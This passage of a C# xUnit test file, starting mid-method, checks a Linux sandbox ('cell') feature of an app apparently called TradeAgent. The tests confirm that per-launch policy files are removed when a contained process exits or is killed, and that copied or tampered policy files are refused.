        using var held = ProcessContainment.Start(psi, w.Policy(), Launcher());
        var file = held.Cell!.PolicyFile;
        Assert.Equal(CellPolicy.Directory, Path.GetDirectoryName(file));
        Assert.True(File.Exists(file), $"the launch's policy file {file} while its cell runs");
        held.Process.StandardInput.Close();
        await held.Process.WaitForExitAsync().WaitAsync(TimeSpan.FromSeconds(90));
        Assert.Equal(0, held.Process.ExitCode);
        Assert.False(File.Exists(file), $"the launch's policy file {file} outlived its cell");

        // A CANCELLED TURN: its supervisor is killed with the cell, so the app removes the file itself.
        var long_ = new ProcessStartInfo("/bin/sh") { UseShellExecute = false, CreateNoWindow = true, RedirectStandardInput = true };
        long_.ArgumentList.Add("-c");
        long_.ArgumentList.Add("sleep 60");
        using var killed = ProcessContainment.Start(long_, w.Policy(), Launcher());
        var killedFile = killed.Cell!.PolicyFile;
        Assert.True(File.Exists(killedFile), $"the launch's policy file {killedFile} while its cell runs");
        await Task.Delay(TimeSpan.FromSeconds(2));
        killed.Kill();
        Assert.False(File.Exists(killedFile), $"the policy file {killedFile} outlived a cell that was killed");
    }

    [LinuxFact]
    public async Task A_cell_stage_refuses_a_policy_file_that_is_not_the_apps_own()
    {
        PlatformIsACells();
        var w = new World("policy");
        var policy = w.Policy();
        var written = policy.Write();

        var copy = Path.Combine(w.Ws, Path.GetFileName(written));
        File.Copy(written, copy);
        var (code, _, err) = await Run(copy);
        Assert.Equal(CellStage.Failed, code);
        Assert.Contains("not in TradeAgent's own cell folder", err);

        var tampered = Path.Combine(CellPolicy.Directory, new string('0', 64) + ".0000000000000000.cell.json");
        File.WriteAllText(tampered, File.ReadAllText(written));
        (code, _, err) = await Run(tampered);
        Assert.Equal(CellStage.Failed, code);
        Assert.Contains("does not hash to its name", err);
        File.Delete(tampered);

        static async Task<(int, string, string)> Run(string policyFile)
        {
            var launcher = Launcher();
            var psi = new ProcessStartInfo(launcher[0])
            {
                UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardError = true
            };
            foreach (var a in launcher.Skip(1)) psi.ArgumentList.Add(a);
            foreach (var a in new[] { ContainedLaunch.Flag, ContainedLaunch.CellFlag, policyFile, "/bin/sh", "-c", "echo entered" })
                psi.ArgumentList.Add(a);
            using var p = Process.Start(psi)!;
            var so = p.StandardOutput.ReadToEndAsync();
            var se = p.StandardError.ReadToEndAsync();
            await p.WaitForExitAsync().WaitAsync(TimeSpan.FromSeconds(60));
            Assert.DoesNotContain("entered", await so);
            return (p.ExitCode, await so, await se);
        }
    }
}
